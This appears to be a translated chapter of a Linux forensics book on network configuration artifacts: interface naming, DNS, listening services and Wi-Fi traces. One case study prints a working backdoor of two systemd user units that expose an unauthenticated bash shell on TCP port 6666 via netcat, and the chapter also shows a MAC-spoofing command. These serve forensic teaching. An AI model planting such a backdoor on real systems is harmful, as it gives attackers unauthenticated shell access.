## 第八章：**识别网络配置产物**

![图片](img/common01.jpg)

对 Linux 系统的法医分析包括网络配置的检查以及过去网络活动的重建。此分析可以用于了解系统的突破或泄露，或者本地用户在机器上的滥用。本章描述了常见的 Linux 网络配置，既包括静态系统（如服务器），也包括动态客户端（如桌面和流动笔记本电脑）。分析内容包括网络接口、分配的 IP 地址、无线网络、附加的蓝牙设备等。安全性方面的内容包括检查 VPN、防火墙和代理设置的证据。

本章并非关于网络取证，也不涉及网络流量捕获或数据包分析。重点仍然是对 Linux 系统的事后分析（“死磁盘”）。然而，本章内容应当补充任何独立的网络取证分析。

### 网络配置分析

网络一直是 Unix 的基础部分，而 TCP/IP 协议支持在 Unix 在互联网中的流行中起到了重要作用。网络同样是 Linux 内核和 Linux 发行版的核心功能。早期的 Unix 和 Linux 系统有一个简单的静态网络配置，预期不会改变，至少不会频繁变化。配置可以在安装时定义，或通过几个文件进行编辑。

如今的网络更加动态，尤其是移动系统，Linux 系统使用网络管理软件来保持网络配置的更新。本节介绍了网络接口和地址配置，随后介绍了管理网络配置的软件。重点突出对法医分析有价值的产物。

#### *Linux 接口与地址配置*

理解网络设备的命名和网络地址配置对于法医检查非常有用。这些知识有助于调查人员在日志、配置文件或其他持久化数据中找到相应的设备和地址的参考。

在系统启动过程中，内核会检测并初始化硬件，包括网络设备。当 Linux 内核找到物理网络接口时，它会自动分配通用名称（之后 systemd 会重命名这些接口）。还可能创建并配置额外的虚拟接口。常见的接口通用名称包括：

| eth0 | 以太网 |
| --- | --- |
| wlan0 | 无线局域网 |
| wwan0 | 移动通信/蜂窝 |
| ppp0 | 点对点协议 |
| br0 | 桥接 |
| vmnet0 | 虚拟机 |

这里的前三个示例是物理硬件接口；最后三个是虚拟接口。当系统有多个同类型的物理接口时会出现问题。内核启动时，它会根据设备被检测到的顺序为网络设备分配通用的接口名称。这个顺序在重启时不一定相同，一个名为`eth0`的以太网接口，下一次系统启动时可能会被命名为`eth1`。为了解决这个问题，systemd 开始通过`systemd-udevd`服务对接口进行重命名，采用一种跨重启一致的命名规则，并且在接口名称中编码设备的信息。

重命名的接口以描述性前缀开头——例如，`en`表示以太网，`wl`表示 WLAN，或`ww`表示 WWAN。PCI 总线用`p`表示，PCI 插槽用`s`表示，PCI 设备功能（如果不为零）用`f`表示。例如，如果运行中的机器有`enp0s31f6`和`wlp2s0`这两个接口，我们知道它们分别是以太网（`en`）和 Wi-Fi（`wl`），并且可以通过`lspci`输出^(1)来匹配 PCI 总线、插槽和功能，如下所示：

```
$ lspci
...
00:1f.6 Ethernet controller: Intel Corporation Ethernet Connection (4) I219-LM (rev 21)
02:00.0 Network controller: Intel Corporation Wireless 8265 / 8275 (rev 78)
...
```

这些只是用于表示设备名称的一些字符。有关 systemd 设备名称的完整描述，请参见 systemd.net-naming-scheme(7) 手册页。

通常，这种自动重命名可能会导致长且复杂的接口名称（例如`wwp0s20f0u2i12`）；然而，这些名称可以被分析以了解更多关于物理硬件的信息。可以在内核日志中观察到重命名的动作；例如：

```
Feb 16 19:20:22 pc1 kernel: e1000e 0000:00:1f.6 enp0s31f6: renamed from eth0
Feb 16 19:20:23 pc1 kernel: iwlwifi 0000:02:00.0 wlp2s0: renamed from wlan0
Feb 16 19:20:23 pc1 kernel: cdc_mbim 2-2:1.12 wwp0s20f0u2i12: renamed from wwan0
```

在这里，笔记本电脑的以太网、Wi-Fi 和 WWAN 接口都已被`systemd-udevd`重命名。系统管理员可以通过引导加载程序内核标志（`net.ifnames=0`）或使用 udev 规则（*/etc/udev/rules.d/**）来防止接口重命名。

分析 MAC 地址可以提供有关硬件或底层协议的信息。物理接口有 MAC 地址，用于在附加网络的链路层识别机器。这些 MAC 地址对于每个网络设备来说是唯一的，可以作为调查中的标识符。制造商根据 IEEE 分配的地址块定义 MAC 地址。IEEE 组织唯一标识符（OUI）数据库（*[`standards.ieee.org/regauth/`](https://standards.ieee.org/regauth/)*) 列出了分配给各个组织的 MAC 地址块。互联网号码分配局（IANA）MAC 地址块（00-00-5E）列出了分配的 IEEE 802 协议号（*[`www.iana.org/assignments/ethernet-numbers/ethernet-numbers.xhtml`](https://www.iana.org/assignments/ethernet-numbers/ethernet-numbers.xhtml)*）。这些都在 RFC 7042 中进行了描述（*[`tools.ietf.org/html/rfc7042/`](https://tools.ietf.org/html/rfc7042/)*）。

使用的 MAC 地址通常可以在设备首次检测到时的内核日志中找到。设备的内核模块记录了 MAC 地址，日志条目在不同设备之间可能略有不同。以下是一些示例：

```
Dec 16 09:01:21 pc1 kernel: e1000e 0000:00:19.0 eth0: (PCI Express:2.5GT/s:Width x1)
 f0:79:59:db:be:05
Dec 17 09:49:31 pc1 kernel: r8169 0000:01:00.0 eth0: RTL8168g/8111g, 00:01:2e:84:94:de,

 XID 4c0, IRQ 135
Dec 16 08:56:19 pc1 kernel: igb 0000:01:00.0: eth0: (PCIe:5.0Gb/s:Width x4) a0:36:9f:44:46:5c
```

在这个例子中，三个不同的内核模块（`e1000e`，`r8169m`，和`igb`）生成了包含 MAC 地址的内核日志。

MAC 地址可以手动修改、随机生成，甚至伪装成另一台机器的地址。修改 MAC 地址的原因可能是出于个人隐私的合法考虑，故意进行反取证以掩盖身份，或是尝试在网络上冒充另一台设备的身份。MAC 地址随机化是 systemd 的一项功能（默认未启用），并且在 systemd.link(5) 手册页中有文档说明。修改 MAC 地址可能在日志中不可见，可以通过配置文件（*/etc/systemd/network/* .link*）、udev 规则（*/etc/udev/rules.d/*.rules*）或手动输入的命令（可能出现在 Shell 历史记录中）来确定。以下命令示例手动更改 MAC 地址：

```
# ip link set eth0 address fe:ed:de:ad:be:ef
```

IP 地址（IPv4 或 IPv6）、路由和其他网络配置信息可以在特定发行版的文件中静态定义，由网络管理器动态配置，或使用如 `ip` 之类的工具手动指定（`ip` 是 ifconfig 的现代替代品）。有关更多信息，请参阅 ip(8) 手册页。

在法医调查的背景下，之前使用的 IP 地址和 MAC 地址可以用来重建过去的事件和活动。可以在本地机器上搜索 IP 和 MAC 地址的地方包括：

+   内核日志（`dmesg`）

+   Systemd 日志和 syslog

+   应用程序日志

+   防火墙日志

+   配置文件

+   缓存和持久化数据

+   用户 XDG 目录中的其他文件

+   系统管理员的 Shell 历史记录

查找 MAC 和 IP 地址的许多地方不在本地机器上，而是在周围的基础设施或远程服务器上。MAC 地址仅在本地子网中可见，因此查找 MAC 地址将仅限于链路层基础设施，如 Wi-Fi 接入点、DHCP 服务器、链路层监控系统（例如 arpwatch）和其他本地网络交换基础设施。在正在进行的事件中，同一子网中的其他机器可能会在其 ARP 缓存中留下嫌疑机器的 MAC 地址痕迹（主要来自广播包）。远程服务器可能会保留大量关于过去 IP 地址的信息。发送遥测数据或包含唯一标识符的其他网络流量的应用程序和操作系统组件，也可能会在远程基础设施中记录。

在一个组织内，CERT/SOC/安全团队可能可以访问更多的安全监控信息来调查事件。在法律管辖区内，执法机构可能会提出请求以调查犯罪活动。

#### *网络管理器和发行版特定配置*

历史上，每个 Linux 发行版以自己的方式管理网络配置。在服务器系统上，随着 systemd 提供了使用单元文件的标准网络配置方法，未来可能会发生变化。在客户端和桌面系统上，动态配置网络（例如 Wi-Fi 或移动协议漫游）的需求增加，网络管理器已变得越来越普遍。

基于 Debian 的系统在 */etc/network/interfaces* 文件中配置网络。该文件指定每个接口的网络配置。接口可以静态配置或使用 DHCP。可以指定 IPv4 和 IPv6 地址，以及静态路由、DNS 等。以下是来自 */etc/network/interfaces* 文件的示例：

```
auto eth0
iface eth0 inet static:
    address 10.0.0.2
    netmask 255.255.255.0
    gateway 10.0.0.1
    dns-domain example.com
    dns-nameservers 10.0.0.1
```

在这里，接口在启动时被配置为静态 IPv4 地址。地址、子网掩码和默认路由被定义。DNS 服务器和搜索域也被配置。包含配置片段的文件也可以存储在 */etc/network/interfaces.d/* 目录中。*/etc/network/* 中的其他目录用于在接口启动或关闭时运行的前置和后置脚本。有关 Debian 或基于 Debian 系统的更多信息，请参见 interfaces(5) 手册页。

Red Hat 和 SUSE 使用 */etc/sysconfig/* 目录来存储配置文件。这些文件包含变量（`key=value`）和 shell 命令，可以包含在其他 shell 脚本中或在系统启动或系统管理过程中由单元文件使用。*/etc/sysconfig/network-scripts/* 和 */etc/ sysconfig/network/* 目录包含网络配置文件。以下示例展示了一个 `enp2s0` 接口的配置：

```
$ cat /etc/sysconfig/network-scripts/ifcfg-enp2s0
TYPE=Ethernet
PROXY_METHOD=none
BROWSER_ONLY=no
BOOTPROTO=dhcp
DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_FAILURE_FATAL=no
IPV6_ADDR_GEN_MODE=stable-privacy
NAME=pc1
UUID=16c5fec0-594b-329e-949e-02e36b7dee59
DEVICE=enp2s0
ONBOOT=yes
AUTOCONNECT_PRIORITY=-999
IPV6_PRIVACY=no
```

在此示例中，定义了 `enp2s0` 接口的配置。这些基于变量的配置文件与工具无关，不同的网络管理工具可以使用相同的配置文件集。SUSE 还推出了 Wicked，这是一个替代的网络配置系统，使用一个守护进程（wickedd）来监控网络接口，并可以通过 D-Bus 控制。*/etc/sysconfig/* 目录仍然会被读取，并且在 */etc/wicked/* 目录中创建了额外的 XML 配置文件。

Arch Linux 项目开发了一个名为 netctl 的网络管理系统，它基于 systemd。Arch 默认没有安装 netctl，但它允许用户选择使用它或其他独立于发行版的网络管理器。Netctl 配置文件按名称存储在 */etc/netctl/* 目录中。

Systemd 提供了使用三种类似于单元文件的网络配置文件来进行网络管理。配置文件通常引用网络设备（例如 eth0），并具有以下扩展名之一：

***.link*** 配置物理网络设备，例如以太网

***.netdev*** 配置虚拟网络设备，例如 VPN 和隧道

***.network*** 配置网络层（IPv4、IPv6、DHCP 等）

systemd-udevd 守护进程使用*.link*文件，systemd-networkd 守护进程使用*.netdev*和*.network*文件。发行版或已安装软件包提供的默认网络配置文件位于*/usr/lib/systemd/network/*目录下。系统管理员自定义的配置位于*/etc/systemd/network/*目录下。检查这些目录将帮助你了解如何使用 systemd 配置网络。

以下是一个*.link*文件的示例：

```
$ cat /etc/systemd/network/00-default.link
[Match]
OriginalName=*

[Link]
MACAddressPolicy=random
```

在这种情况下，默认的链接配置被覆盖，因此接口在启动时会获得一个随机生成的 MAC 地址。

这是一个*.netdev*文件的示例：

```
$ cat /etc/systemd/network/br0.netdev
[NetDev]
Name=br0
Kind=bridge
```

这个简单的*.netdev*文件定义了一个名为`br0`的桥接接口。然后，可以在*.network*文件中将一个接口添加到桥接中，如下所示：

```
$ cat /etc/systemd/network/eth1.network
[Match]
Name=eth1

[Network]
Address=10.0.0.35/24
Gateway=10.0.0.1
```

在这里，为`eth1`接口定义了一个静态 IP 地址、子网掩码(`/24`)和默认路由。有关更多信息，请参见 systemd.link(5)、systemd.netdev(5)和 systemd.network(5)手册页。

许多 Linux 系统使用 NetworkManager 守护进程来管理网络配置，尤其是在桌面系统上。配置数据位于*/etc/NetworkManager/*目录中。*NetworkManager.conf*文件包含一般配置信息，单独的连接按名称定义在*/etc/NetworkManager/system-connections/*目录中。对于 Wi-Fi 连接，这些文件可能包含网络名称和密码。有关更多细节，请参见 NetworkManager(8)和 NetworkManager.conf(5)手册页。

#### *DNS 解析*

互联网上的计算机系统使用域名系统（DNS）从主机名确定 IP 地址，并从 IP 地址确定主机名。^(2) 这种在线查找被称为 DNS 解析，Linux 机器通过名为*DNS 解析器*的机制实现这一过程。与 IP 地址和路由不同，DNS 解析并非在内核中配置，而是在用户空间完全运行。解析器功能是内置在标准 C 库中的，使用*/etc/resolv.conf*文件来指定本地 DNS 配置。

该配置文件包含 DNS 名称服务器的 IP 地址列表，并可能还包含本地系统使用的域名。IP 地址可以是 IPv4 或 IPv6，并指向由本地网络管理员、互联网服务提供商（ISP）或 DNS 提供商运行的 DNS 服务器。以下是一个*resolv.conf*文件的示例：

```
$ cat /etc/resolv.conf
search example.com
nameserver 10.0.0.1
nameserver 10.0.0.2
```

这里，搜索域附加到简单的主机名，并指定了两个名称服务器（如果第一个服务器不可用，则尝试第二个）。更现代的解析器实现支持通过 D-Bus 和本地套接字进行解析。

你可以在 resolv.conf(5)手册页中找到其他选项。另外，可能存在一个*/etc/resolv.conf.bak*文件，包含之前 DNS 配置的设置。*resolv.conf*文件的文件系统时间戳将指示该文件何时生成。

随着漫游和移动设备使得网络变得更加动态，系统管理员、网络管理员、守护进程和其他程序都希望修改*resolv.conf*文件。这导致了问题，因为有时一个程序（或人员）会撤销另一个程序所做的更改，从而造成混乱。如今，*resolv.conf*文件通常通过一个名为*resolvconf*的框架进行管理。

根据 Linux 发行版的不同，使用的 resolvconf 框架可能是 openresolv 或 systemd 的 resolvconf。systemd-resolved 守护进程在*/etc/systemd/resolved.conf*文件中进行配置；例如：

```
$ cat /etc/systemd/resolved.conf
...
[Resolve]
DNS=10.0.1.1
Domains=example.com
...
# Some examples of DNS servers which may be used for DNS= and FallbackDNS=:
# Cloudflare: 1.1.1.1 1.0.0.1 2606:4700:4700::1111 2606:4700:4700::1001
# Google:     8.8.8.8 8.8.4.4 2001:4860:4860::8888 2001:4860:4860::8844
# Quad9:      9.9.9.9 2620:fe::fe
#DNS=
#FallbackDNS=1.1.1.1 9.9.9.10 8.8.8.8 2606:4700:4700::1111 2620:fe::10
2001:4860:4860::8888
```

systemd-resolved 系统根据*/etc/systemd/resolved.conf*文件中的参数管理*resolv.conf*文件，并指定 DNS 服务器、域、后备服务器以及其他 DNS 解析器配置。替代的 openresolv 框架将其配置存储在*/etc/resolvconf.conf*文件中。有关更多详细信息，请参阅 resolvconf(8)手册页。

一些应用程序能够使用 DNS over HTTPS（DoH）或 DNS over TLS（DoT），其中 DNS 查询通过加密连接发送到 DNS 提供商。许多现代网页浏览器提供此功能，绕过了本地 DNS 解析系统。请确保检查浏览器配置，以查看是否有替代的 DNS 提供商。Systemd 目前支持 DoT。

解析器配置文件很有趣，因为它们提供了 Linux 系统与 ISP 或 DNS 提供商之间的链接。ISP 或 DNS 提供商可能有 DNS 查询和时间戳的日志，供调查人员在请求时查阅。DNS 服务器上记录的 DNS 查询可以提供大量关于机器活动的信息，如下所示：

+   用户访问过的网站历史记录（包括重复访问的频率）

+   电子邮件、消息和社交媒体活动（使用的服务提供商及其频率）

+   使用任何检查更新或发送遥测请求的应用程序

+   在服务器系统上，反向 DNS^(3)查找可能表示对正在调查的 Linux 系统的网络连接（已解析的 FQDN 可能会在日志中可见）

+   任何其他已查询的 DNS 资源记录（MX、TXT 等）

在一个组织内，CERT/SOC/安全团队可能有权访问这些信息，以调查安全事件。在某个法律管辖区内，执法机关可能能够依法请求这些信息，以调查犯罪活动。

*/etc/nsswitch.conf*文件的开发旨在允许为用户、组、主机查找等多个信息源（数据库）提供支持。`hosts:`条目定义了如何进行查找；例如：

```
$ cat /etc/nsswitch.conf
...
hosts:     files dns
...
```

在这里，该条目表示应该首先查询本地文件（*/etc/hosts*），然后才是 DNS。该行可能定义了条件语句或其他数据库。有关更多信息，请参阅 nsswitch.conf(5) 手册页。

*/etc/hosts* 文件早于 DNS，是一个本地的 IP 到主机名的映射表。系统在尝试使用 DNS 解析主机名或 IP 地址之前，会首先检查此文件。*hosts* 文件今天通常用于配置本地主机名和定义自定义的 IP/主机名对。在取证检查中，应检查此文件是否有任何系统管理员或恶意行为者所做的更改。

最后，Avahi 是 Linux 实现的 Apple Zeroconf 规范。Zeroconf（因此 Avahi）使用多播 DNS 在本地网络上发布服务（例如文件共享）。这些服务可以被本地网络上的其他客户端发现。Avahi 配置文件位于 */etc/avahi/*，而 avahi 守护进程将活动日志记录到日志系统（搜索 avahi-daemon 的日志）。

#### *网络服务*

一些 Linux 守护进程在网络接口上监听传入的服务请求。在传输层，通常是一个监听的 UDP 或 TCP 套接字。UDP 和 TCP 套接字绑定到一个或多个接口，并监听指定的端口号。在取证检查中，我们关心的是识别在启动时启动的监听服务，可能还包括在机器运行过程中启动的服务。这些服务可能是正常的合法服务，系统所有者出于恶意目的运行的服务，或者是恶意行为者启动的服务（例如后门）。

许多网络服务有一个守护进程常驻在系统上，接受来自远程客户端通过网络的连接请求。这些服务的配置通常包括监听的端口和接口。该配置由传递给守护进程程序二进制文件的标志、配置文件或编译时的默认值指定。网络守护进程的配置文件没有统一的语法，但存在一些相似之处。以下是一些常见守护进程及其关联的监听服务配置语法：

```
/etc/mysql/mariadb.conf.d/50-server.cnf
bind-address = 127.0.0.1

/etc/mpd.conf
bind_to_address "10.0.0.1"

/etc/ssh/sshd_config
Port 22
AddressFamily any
ListenAddress 0.0.0.0
ListenAddress ::

/etc/apache2/ports.conf
Listen 80
Listen 443

/etc/cups/cupsd.conf
Listen 10.0.0.1:631

/etc/dnsmasq.conf
interface=wlan0
```

这些示例展示了不同网络服务守护进程之间的配置文件语法完全不同。然而，它们都指定了相同的内容，如端口号（可能不止一个）、地址族（IPv4、IPv6 或两者），或监听的接口（通过 IP 地址或网络设备名称）。

在运行中的系统上，`ss` 工具（`netstat` 的现代替代品）可以显示所有监听端口以及守护进程的名称。例如，我们可以使用 `ss -lntup` 显示所有监听的数值型 TCP 和 UDP 端口以及监听进程的名称。但是在文件系统的死后取证分析中，我们只有配置文件和日志来确定哪些服务在监听。此分析涉及检查所有启用的网络守护进程，并单独检查它们的配置文件以寻找监听接口或 IP 地址（如果没有定义，则使用编译时的默认值）。

许多服务在启动时会发出日志消息，描述它们如何在机器上监听：

```
Dec 17 09:49:32 pc1 sshd[362]: Server listening on 0.0.0.0 port 22.
Dec 17 09:49:32 pc1 sshd[362]: Server listening on :: port 22.
...
pc1/10.0.0.1 2020-12-16 07:28:08 daemon.info named[16700]: listening
on IPv6 interfaces, port 53
```

在这些示例中，secure shell 守护进程（`sshd`）和 Bind DNS 服务器（`named`）在启动时都记录了它们的监听配置。

仅绑定到本地主机（127.0.0.1 或 ::1）的服务只能从本地机器访问，而无法从附加网络（如互联网）访问。这种受限监听通常用于后端服务，如数据库，这些服务仅由其他本地守护进程访问，但绝不用于通过网络提供给远程机器。一些事件涉及这些后端服务的配置错误，导致它们意外地暴露到互联网，从而可能被滥用或遭到攻击。

拥有多个网络接口的主机被称为 *多网卡系统*，通常包括防火墙、代理服务器、路由器或具有虚拟接口的机器，这些接口来自 VPN 或隧道。客户端程序可能具有标志或配置，定义了使用哪个接口（或 IP）作为来源。例如，`ping` 命令具有 `-I` 标志，用于指定源 IP 或接口。Secure shell (SSH) 客户端可以使用 `-b` 标志或 `bindaddress` 指令来指定具有多个接口的机器上的源 IP。

在取证分析中，这些标志或配置可能很重要，因为它们指示了已建立网络连接的源 IP，或来自哪个接口的网络流量。IP 地址可能与远程日志、入侵检测系统（IDS）或网络取证分析相关联。

一些网络服务是通过基于网络的激活机制按需启动的。传统的 Unix 风格的网络服务激活使用一个名为 inetd（或 xinetd，一个流行的替代品）的守护进程，它监听多个传入的 TCP 和 UDP 端口，并在尝试连接时启动相应的守护进程。systemd **.socket** 文件为按需启动的守护进程执行类似的基于套接字的激活。

##### 案例研究：网络后门

我将通过一个使用 systemd 套接字激活实现的后门案例来结束本节。在这个例子中，两个恶意的单元文件被写入用户的 systemd 单元目录（*.config/systemd/user/*），提供了一个通过套接字激活的后门 shell：

```
$ cat /home/sam/.config/systemd/user/backdoor.socket
[Unit]
Description=Backdoor for Netcat!

[Socket]
ListenStream=6666
Accept=yes

[Install]
WantedBy=sockets.target
```

如果启用，这个 *backdoor.socket* 文件会监听 TCP 端口 6666，并在收到连接时启动 *backdoor.service* 单元：

```
$ cat /home/sam/.config/systemd/user/backdoor@.service
[Unit]
Description=Backdoor shell!

[Service]
Type=exec
ExecStart=/usr/bin/bash
StandardInput=socket
```

这个 *backdoor.service* 文件启动一个 Bash Shell，并将输入和输出（`stdin` 和 `stdout`）传递给连接的网络客户端。远程攻击者可以使用 netcat 访问后门并运行 Shell 命令（使用 CTRL-C 断开连接）：

```
$ netcat pc1 6666
whoami
sam
^C
```

当用户登录时，后门可用，且可以作为该用户运行 Shell 命令。这个后门是一个未经身份验证的 Shell 访问示例，使用套接字激活来访问 Linux 机器。

套接字激活服务在日志中可见：

```
Dec 18 08:50:56 pc1 systemd[439]: Listening on Backdoor for Netcat!.
...
Dec 18 11:03:06 pc1 systemd[439]: Starting Backdoor shell! (10.0.0.1:41574)...
Dec 18 11:03:06 pc1 systemd[439]: Started Backdoor shell! (10.0.0.1:41574).
...
Dec 18 11:03:15 pc1 systemd[439]: backdoor@4-10.0.0.2:6666-10.0.0.1:41574.service: Succeeded.
```

这里，第一条日志记录是监听器已启动的消息，接下来的两条记录显示了来自远程 IP 的传入连接，导致服务启动。最后一条记录是连接的终止，包括有关 TCP 会话的信息（源和目标端口及 IP 地址）。

### 无线网络分析

无线移动设备的增长和无线技术的便利性促使了无线标准在 Linux 系统中的实现。最常见的包括 Wi-Fi、蓝牙和 WWAN 移动技术。这三种技术中的每一种都会在本地系统上留下取证调查人员可能感兴趣的证据痕迹。此外，Linux 机器连接的无线设备或基础设施也可能留下证据痕迹（洛卡尔定律适用于无线技术）。

#### *Wi-Fi 痕迹*

802.11x Wi-Fi 标准允许客户端计算机无线连接到接入点（AP），也称为热点或基站。从取证的角度来看，我们正在寻找可能在 Linux 系统中找到的各种痕迹：

+   SSID（服务集标识符），已连接 Wi-Fi 网络的名称

+   BSSID（基本 SSID），已连接基站的 MAC 地址

+   连接的 Wi-Fi 网络的密码

+   如果 Linux 系统是一个 AP，SSID 和密码

+   如果 Linux 系统是一个 AP，哪些客户端连接

+   其他配置参数

我们可以在配置文件、日志和其他持久性缓存数据中找到这些痕迹。

计算机通常使用各种身份验证和安全形式连接到 Wi-Fi 网络，其中 WPA2（Wi-Fi 保护访问 2）是当前最流行的。管理 Linux 上的 WPA2 需要一个守护进程来监控和管理密钥协商、身份验证以及内核 Wi-Fi 设备的关联/去关联。wpa_supplicant 守护进程最初于 2003 年为此目的开发，并广泛使用至今。

iwd 守护进程由英特尔创建，并于 2018 年发布，作为 wpa_supplicant 的现代化简化替代品。这两种实现可能包含配置数据、日志和缓存信息，取证检查员可能对此感兴趣。

`wpa_supplicant` 守护进程（属于名为 wpa_supplicant 或 wpasupplicant 的软件包的一部分）可以将静态配置存储在 */etc/wpa_supplicant.conf* 中，但通常是通过网络管理器动态地通过 D-Bus 进行配置。守护进程可能会将信息记录到系统日志中，例如：

```
Dec 01 10:40:30 pc1 wpa_supplicant[497]: wlan0: SME: Trying to authenticate with 80:ea:96:eb
:df:c2 (SSID='Free' freq=2412 MHz)
Dec 01 10:40:30 pc1 wpa_supplicant[497]: wlan0: Trying to associate with 80:ea:96:eb:df:c2 (
SSID='Free' freq=2412 MHz)
Dec 01 10:40:30 pc1 wpa_supplicant[497]: wlan0: Associated with 80:ea:96:eb:df:c2
Dec 01 10:40:30 pc1 wpa_supplicant[497]: wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
Dec 01 10:40:31 pc1 wpa_supplicant[497]: wlan0: WPA: Key negotiation completed with 80:ea:96
:eb:df:c2 [PTK=CCMP GTK=CCMP]
Dec 01 10:40:31 pc1 wpa_supplicant[497]: wlan0: CTRL-EVENT-CONNECTED - Connection to 80:ea:
96:eb:df:c2 completed [id=0 id_str=]
...
Dec 01 10:45:56 pc1 wpa_supplicant[497]: wlan0: CTRL-EVENT-DISCONNECTED bssid=80:ea:96:eb:df
:c2 reason=3 locally_generated=1
```

在这个例子中，运行 `wpa_supplicant` 的 Linux 系统连接到了 `Free` 网络，并在几分钟后断开连接。

内核可能会记录与加入和断开 Wi-Fi 网络相关的某些活动，如下例所示：

```
Aug 22 13:00:58 pc1 kernel: wlan0: authenticate with 18:e8:29:a8:8b:e1
Aug 22 13:00:58 pc1 kernel: wlan0: send auth to 18:e8:29:a8:8b:e1 (try 1/3)
Aug 22 13:00:58 pc1 kernel: wlan0: authenticated
Aug 22 13:00:58 pc1 kernel: wlan0: associate with 18:e8:29:a8:8b:e1 (try 1/3)
Aug 22 13:00:58 pc1 kernel: wlan0: RX AssocResp from 18:e8:29:a8:8b:e1 (capab=
0x411 status=0 aid=4)
Aug 22 13:00:58 pc1 kernel: wlan0: associated
```

这里，接入点的 MAC 地址显示了系统成功认证的时间戳。

iwd 守护进程可以通过 D-Bus 被不同的网络管理器控制。配置文件是 */etc/iwd/main.conf*，该文件在 iwd.config(5) 手册页中有文档说明。 */var/lib/iwd/** 目录包含每个使用 iwd 配置的网络的文件。

例如，以下是一个名为 *myfreewifi* 的网络文件：

```
# cat /var/lib/iwd/myfreewifi.psk
[Security]
PreSharedKey=28387e78ea98cceda4be87c9cf1a62fb8639dd48ea3d3352caca80ec5dfe3e68
Passphrase=monkey1999

[Settings]
AutoConnect=false
```

网络的名称是文件名的一部分。文件内容包含网络密码及其他设置。文件的创建时间戳可能是网络首次创建并加入的时间指示符。iwd.network(5) 手册页提供了有关文件内容的更多信息。

在一些发行版（如 Red Hat 和 SUSE）中，配置的 Wi-Fi 详细信息可能位于 */etc/sysconfig/* 目录中，例如：

```
# cat /etc/sysconfig/network/ifcfg-wlan0
NAME=''
MTU='0'
BOOTPROTO='dhcp'
STARTMODE='ifplugd'
IFPLUGD_PRIORITY='0'
ZONE=''
WIRELESS_ESSID='myhotspot'
WIRELESS_AUTH_MODE='psk'
WIRELESS_MODE='managed'
WIRELESS_WPA_PSK='monkey1999'
WIRELESS_AP_SCANMODE='1'
WIRELESS_NWID=''
```

在这里，*myhotspot* Wi-Fi 网络被配置并保存到 *ifcfg-wlan0* 文件中，密码也以明文显示。

NetworkManager 将连接信息存储在 */etc/ NetworkManager/system-connections/* 目录中。每个连接网络都有一个文件：

```
# cat /etc/NetworkManager/system-connections/Free_WIFI
[connection]
id=Free_WIFI
uuid=320c6812-39b5-4141-9f8e-933c53365078
type=wifi
permissions=
secondaries=af69e818-4b14-4b1f-9908-187055aaf13f;
timestamp=1538553686

[wifi]
mac-address=00:28:F8:A6:F1:85
mac-address-blacklist=
mode=infrastructure
seen-bssids=D0:D4:12:D4:23:9A;
ssid=Free_WIFI

[wifi-security]
key-mgmt=wpa-psk
psk=monkey1999

[ipv4]
dns-search=
method=auto

[ipv6]
addr-gen-mode=stable-privacy
dns-search=
ip6-privacy=0
method=auto
```

这显示了 Wi-Fi 网络的详细信息，包括网络首次配置的时间戳、SSID 名称、BSSID MAC 地址等。根据配置，可能还会找到密码。

此外，NetworkManager 会将信息保存到 */var/lib/NetworkManager/* 目录，你可以在这里找到 DHCP 租约文件，里面包含从各个接口获得的租约信息，如下所示：

```
# cat internal-320c6812-39b5-4141-9f8e-933c53365078-wlan0.lease
# This is private data. Do not parse.
ADDRESS=192.168.13.10
NETMASK=255.255.255.0
ROUTER=192.168.13.1
SERVER_ADDRESS=192.168.13.1
NEXT_SERVER=192.168.13.1
T1=43200
T2=75600
LIFETIME=86400
DNS=192.168.13.1
DOMAINNAME=workgroup
HOSTNAME=pc1
CLIENTID=...
```

文件的创建（出生）时间戳表示 DHCP 服务器分配租约的时间，名为 *timestamps* 的文件包含一个租约列表，其中每个租约都与一个租约文件名和一个数字时间戳相关联：

```
# cat timestamps
[timestamps]
...
320c6812-39b5-4141-9f8e-933c53365078=1538553686
...
```

此外，记录了曾经见到的 BSSID（MAC 地址）列表，保存在 *seen-bssids* 文件中：

```
[seen-bssids]
320c6812-39b5-4141-9f8e-933c53365078=D0:D4:12:D4:23:9A,
...
```

一个 Wi-Fi 网络（具有相同 SSID）可能包含多个 BSSID。

##### Linux 访问点

如果使用 Linux 系统作为接入点，它最有可能使用 hostapd 软件包。检查是否安装了 hostapd 包，以及它是否被启用作为 systemd 服务运行。hostapd 配置文件通常位于 */etc/hostapd/**，而 *hostapd.conf* 文件包含提供的 Wi-Fi 网络的配置，如下所示：

```
# cat /etc/hostapd/hostapd.conf
...
ssid=Bob's Free Wifi
...
wpa_passphrase=monkey1999
...
ignore_broadcast_ssid=1
...
country_code=CH
...
```

显示了 Wi-Fi 网络名称和密码，它是一个隐藏网络（广播被忽略），并指定了区域（符合监管要求）。原始的 *hostapd.conf* 文件有详细的注释，提供了更多的参数示例，更多信息可以在 *[`w1.fi/hostapd/`](https://w1.fi/hostapd/)* 查找。

密码也可以以基于密码的密钥派生函数（PBKDF2）格式存储，在这种情况下，恢复较为困难，但可以尝试使用密码恢复工具。*hostapd.conf* 中的预共享密钥（PSK）字符串如下所示：

```
wpa_psk=c031dc8c13fbcf26bab06d1bc64150ca53192c270f1d334703f7b85e90534070
```

这个字符串并没有揭示密码，但足以访问 Wi-Fi 网络。密码可能在附加到同一网络的另一个客户端设备上找到。

有多个地方可以查找连接到 hostapd 接入点的客户端的 MAC 地址。Hostapd 默认将日志写入 syslog，连接和断开连接的其他客户端的 MAC 地址可能会在其中找到：

```
Aug 22 09:32:19 pc1 hostapd[4000]: wlan0: STA 48:4b:aa:91:06:89 IEEE 802.11: authenticated
Aug 22 09:32:19 pc1 hostapd[4000]: wlan0: STA 48:4b:aa:91:06:89 IEEE 802.11: associated (aid 1)
Aug 22 09:32:19 pc1 hostapd[4000]: wlan0: AP-STA-CONNECTED 48:4b:aa:91:06:89
...
Aug 22 09:32:29 pc1 hostapd[4000]: wlan0: AP-STA-DISCONNECTED 48:4b:aa:91:06:89
Aug 22 09:32:29 pc1 hostapd[4000]: wlan0: STA 48:4b:aa:91:06:89 IEEE 802.11: disassociated
Aug 22 09:32:30 pc1 hostapd[4000]: wlan0: STA 48:4b:aa:91:06:89 IEEE 802.11: deauthenticated
due to inactivity (timer DEAUTH/REMOVE)
```

